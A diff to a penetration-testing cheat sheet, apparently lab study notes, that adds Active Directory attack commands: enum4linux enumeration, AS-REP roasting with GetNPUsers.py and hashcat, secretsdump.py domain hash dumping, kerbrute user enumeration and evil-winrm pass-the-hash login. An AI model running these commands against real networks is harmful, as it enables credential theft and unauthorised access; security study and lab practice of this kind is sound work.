@@ -14,6 +14,8 @@
 - [scp](#scp)
 - [nmap](#nmap)
 - [fping](#fping)
+- [enum4linux](#enum4linux)
+- [enum4linux-ng](#enum4linux-ng)
 - [tcpdump](#tcpdump)
 - [Responser](#responder)
 - [ffuf](#ffuf)
@@ -30,6 +32,7 @@
 - [crackmapexec](#crackmapexec)
 - [kerbrute](#kerbrute)
 - [impacket](#impacket)
+  - [GetNPUsers.py](#getnpuserspy)
   - [GetUserSPNs.py](#getuserspnspy)
 
 ---
@@ -118,12 +121,14 @@ $ sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
 
 # Hashcat
 tag: Misc
+https://hashcat.net/wiki/doku.php?id=example_hashes 
 ```zsh
 $ hashcat -m 13100 bob_tgs /usr/share/wordlists/rockyou.txt
 $ hashcat -m 5600 era_ntlmv2 /usr/share/wordlists/rockyou.txt
 $ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
 $ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
 $ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
+$ hashcat -m 18200 output_GetNPUsers.txt /usr/share/wordlists/rockyou.txt
 ```
 
 # John
@@ -170,6 +175,8 @@ $ scp TestUser@HOGE.com:C:/Users/TestUser/Documents/20240518062907_BloodHound.zi
 $ sudo nmap XXX.XXX.XXX.XXX -p49555 -sV
 $ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p-
 $ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p8080
+$ sudo nmap -sV -sC -p139,445 172.16.5.5
+$ sudo nmap -sV -sC -p 0-10000 172.16.5.5
 $ sudo nmap -A -p- 172.16.5.5
 $ sudo nmap -sV -p- 172.16.5.130
 $ sudo nmap -sV -p- 172.16.5.225
@@ -178,6 +185,21 @@ $ sudo nmap -sV -p- 172.16.5.225
 # fping
 ```zsh
 $ fping -asgq 172.16.5.0/23
+```
+
+# enum4linux
+```zsh
+# sudo echo 172.16.0.10 hoge.com >> /etc/hosts
+$ enum4linux -a hoge.com | tee output_enum4linux_a_hoge-com.ans
+$ enum4linux -a XXX.XXX.XXX.XXX | tee output_enum4linux_a_ip.ans
+$ enum4linux -P XXX.XXX.XXX.XXX
+$ enum4linux -U XXX.XXX.XXX.XXX | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+# enum4linux-ng
+```zsh
+$ enum4linux-ng -P 172.16.0.10 -oA my_output
+$ cat my_output.json
 ```
 
 # tcpdump  
@@ -571,10 +593,6 @@ PS> Get-DomainUser -Identity hoge | select samaccountname,objectsid,memberof,use
 PS> sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
 PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
 ```
-```zsh
-$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
-$ ls inlanefreight_hashes*
-```
 
 # SpoolSample.exe
 ```powershell
@@ -626,12 +644,9 @@ PS> .\Inveigh.exe
 # kerbrute
 tag: Enumerating Users
 ```zsh
-$ sudo git clone https://github.com/ropnop/kerbrute.git
-$ make help
-$ sudo make all
-$ ls dist/
-$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
 $ kerbrute userenum -d HOGE.com --dc 172.16.0.10 mylist.txt -o valid_ad_users
+# $ sudo echo 1721.16.0.10 HOGE.com >> /etc/hosts
+$ kerbrute userenum --dc HOGE.com -d HOGE.com ./userlist.txt
 $ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
 $ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
 $ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt
@@ -649,6 +664,11 @@ $ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
 ```
 
 # impacket
+## GetNPUsers.py
+```zsh
+$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt hoge.com/ | tee output_GetNPUsers.ans
+$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt -outputfile ./output_GetNPUsers.txt hoge.com/
+```
 ## GetUserSPNs.py
 ```zsh
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
@@ -656,6 +676,13 @@ $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo r-request
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
 # -> Hashcat
+```
+## secretsdump.py
+```zsh
+$ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
+$ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
+$ ls hoge-com_hashes*
+```
 ```
 ## ntlmrelayx.py
 ```zsh
@@ -667,16 +694,9 @@ tag: shell
 $ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
 ```
 
-# enum4linux
+# Evil-WinRM
 ```zsh
-$ enum4linux -P XXX.XXX.XXX.XXX
-$ enum4linux -U XXX.XXX.XXX.XXX | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
-```
-
-# enum4linux-ng
-```zsh
-$ enum4linux-ng -P 172.16.0.10 -oA my_output
-$ cat my_output.json
+$ evil-winrm -i HOGE.com -u TestUser -H TestNTHash
 ```
 
 # ldapsearch
